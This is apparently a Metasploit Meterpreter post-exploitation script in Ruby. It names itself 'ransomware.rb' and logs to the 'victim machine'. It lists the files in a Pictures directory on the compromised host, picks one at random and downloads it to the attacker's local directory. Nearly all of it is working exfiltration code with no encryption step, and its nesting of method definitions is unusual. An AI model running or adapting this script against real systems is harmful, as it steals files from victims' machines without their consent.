def run_script(client)
cmd_exec("echo 'ransomware.rb started' >> /tmp/ransomware_debug.log")
print_status("DEBUG: Log file created on victim machine.")

# List files in /home/kali/images directory
def list_files(client, directory)
  result = client.fs.dir.entries(directory)
  # Filter out `.` and `..`
  result.reject { |file| file == '.' || file == '..' }
end

# Choose a random file from the list
def choose_random_file(files)
  files.sample
end

# Download the file
def download_file(client, remote_path, local_path)
  print_status("Downloading #{remote_path} to #{local_path}")
  client.fs.file.download(local_path, remote_path)
end

# Main script logic
begin
  directory = "/home/kali/Pictures"
  local_download_path = "/home/kali/Downloads" # Local directory to save the file

  # Ensure the directory exists
  print_status("Listing files in #{directory}")
  files = list_files(client, directory)
  if files.empty?
    print_error("No files found in #{directory}")
    exit
  end

  # Choose a random file
  random_file = choose_random_file(files)
  print_good("Selected random file: #{random_file}")

  # Download the file
  remote_path = "#{directory}/#{random_file}"
  download_file(client, remote_path, "#{local_download_path}/#{random_file}")
  print_good("Download complete")

rescue ::Exception => e
  print_error("An error occurred: #{e.class} #{e.message}")
end
end
